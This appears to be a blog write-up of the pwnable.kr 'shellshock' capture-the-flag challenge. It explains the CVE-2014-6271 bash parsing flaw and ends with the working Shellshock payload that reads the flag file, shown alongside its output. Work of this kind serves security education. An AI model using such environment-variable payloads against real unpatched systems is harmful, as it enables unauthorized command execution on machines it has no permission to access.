---
title: "Writeup: shellshock"
date: 2020-12-14T23:00:54+08:00
draft: false
---

This is a challenge in [pwnable.kr](https://pwnable.kr/). The home directory contains the following files: 

```
shellshock@pwnable:~$ ls -al
total 980
drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
drwxr-xr-x 116 root root             4096 Apr 17  2020 ..
-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
d---------   2 root root             4096 Oct 12  2014 .bash_history
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
```

The source code can be displayed as follows. 

```
shellshock@pwnable:~$ cat shellshock.c
#include <stdio.h>
int main(){
      setresuid(getegid(), getegid(), getegid());
      setresgid(getegid(), getegid(), getegid());
      system("/home/shellshock/bash -c 'echo shock_me'");
      return 0;
}
```

Originally, the permission of the executable shellshock is `r-xr-sr-x`, that is, our permission (other) is r-x. The function setresuid() is used to set the real, effective, and saved user ID; setresuid() has analogous function that set the real, effective, and saved group ID. Since shellshock belongs to the group shellshock_pwn, after executing the setresuid and setresgid function, we are able to own the same permission as group shellshcok_pwn.

[Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) is a vulnerability in the Bash shell, it is first published in 2014. According to the report [CVE-2014-6271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271), attackers can exploit it with a crafted environment variable. The problem is about parse logic, it is located in [variables.c](http://git.savannah.gnu.org/cgit/bash.git/tree/variables.c?id=ac50fbac377e32b98d2de396f016ea81e8ee9961#n315). Here is the part of source code. 

```
void initialize_shell_variables (env, privmode)
     char **env;
     int privmode;
{
    ...
    for (string_index = 0; string = env[string_index++]; )
    	...
      	/* If exported function, define it now.  Don't import functions from
	 the environment in privileged mode. */
      	if (privmode == 0 && read_but_dont_execute == 0 && STREQN ("() {", string, 4))
      	{
            ...
            if (posixly_correct == 0 || legal_identifier (name))
                parse_and_execute (temp_string, name, SEVAL_NONINT|SEVAL_NOHIST);
```

As you can see, STREQN ("() {", string, 4) means the program check whether the first 4-byte of the string is "() {" or not. If the string starts at "() {", the shell program will regard it as an environment variable. However, it may cause a security problem since more general strings are allowed to be executed. 

For example, the string can contain two commands which are separated by a semicolon (;) symbol, then both the commands will be executed. 

```
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
                 ^^^^^^^^^^^^^^^                                arbitrary command
```

Now, let's check if Shellshock vulnerability exists in the challenge. Obviously, the bash provided is not safe. 
```
shellshock@pwnable:~$ env x='() { :;}; echo velnerable' ./bash -c "echo this is a test"
velnerable
this is a test
```

So we can exploit it and get the flag. 

```
shellshock@pwnable:~$ env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
```

<br>

## Reference

1. Computer & Internet Security: A Hands-on Approach, Wenliang Du. 
2. CVE-2014-6271 (Shellshock): The story of a permissive parser, Portcullis Labs. 